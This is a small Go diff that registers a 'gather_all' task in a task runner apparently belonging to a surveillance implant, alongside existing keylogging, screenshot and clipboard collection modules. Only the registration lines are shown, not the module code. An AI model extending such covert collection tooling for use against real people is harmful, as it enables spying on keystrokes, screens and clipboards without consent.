@@ -79,6 +79,9 @@ func (r *TaskRunner) registerDefaults() {
 		// Collection (keylogging, screenshot, clipboard)
 		"collect_keylog":        module.RunCollectKeylog,
 		"collect_screenshot":    module.RunCollectScreenshot,
+
+		// Gather all — runs every intelligence-gathering module at once
+		"gather_all": module.RunGatherAll,
 		"collect_clipboard":     module.RunCollectClipboard,
 		"collect_all":           module.RunCollectAll,
 
